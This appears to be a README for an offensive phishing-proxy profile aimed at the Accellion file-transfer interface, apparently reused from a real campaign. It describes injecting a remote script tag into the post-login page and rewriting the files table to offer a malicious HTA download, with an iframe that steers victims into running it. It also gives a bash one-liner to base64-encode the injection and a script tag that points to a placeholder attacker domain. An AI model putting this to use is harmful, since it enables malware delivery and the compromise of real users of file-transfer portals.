# Advanced HTA File Delivery Notes

This is an advanced profile that uses JavaScript to rewrite the Accellion interface and inject a download link into the files table. It was used to deliver an HTA file in the original campaign, which is why references to HTA files are present. The JavaScript and HTML files will need patching in order to use this. Also, I had credentials for a server at one point so the configuration files _should_ be able detect successful authentication and redirect accordingly.

- Profile updates the post-authenticated landing page
- Injects a script tag that imports a remote JavaScript file
- JavaScript file rewrites application such that a download link for an HTA file is created

## JavaScript File (`innocuous.js`)

- see innocuous.js and updatevalues where necessary
- search for `TODO` tags within the file for key values

## HTML File (`if.html`)

- contains html content to inject an iframe that assists the user with executing the hta file
- this iframe is written into html by `innocuous.js`

## JavaScript Injection

- Update the following string with the appropriate values
- The referenced file will be imported into the DOM by injecting the tag into the body of each request
- See the `rules` element of the configuration file
- *_must be base64 encoded before being added to rules_*
- Bash command for quick encoding: `base64 -w0 <(echo -n '<script src="https://www.yourdomain.com/javascriptfilehere.js"></script></body>')`

```html
<script src="https://www.yourdomain.com/javascriptfilehere.js"></script></body>
```
